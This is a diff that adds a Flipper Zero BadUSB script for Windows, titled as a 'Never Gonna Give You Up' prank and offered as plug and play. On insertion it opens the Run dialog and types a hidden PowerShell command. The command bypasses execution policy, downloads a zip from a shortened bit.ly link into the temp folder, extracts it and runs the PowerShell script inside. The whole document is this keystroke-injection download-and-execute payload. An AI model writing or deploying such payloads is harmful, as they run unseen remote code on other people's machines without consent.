@@ -1,0 +1,13 @@
+REM    Title: Never Gonna Give You Up
+REM    Author: Aleff
+REM    Target: Windows 10, 11
+
+REM    --------------------------------------------------------------------------------------
+REM    FLIPPER ZERO PAYLOAD PLUG AND PLAY
+REM    --------------------------------------------------------------------------------------
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'bit.ly/NeverGonnaGiveYouUpWindows' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
+ENTER
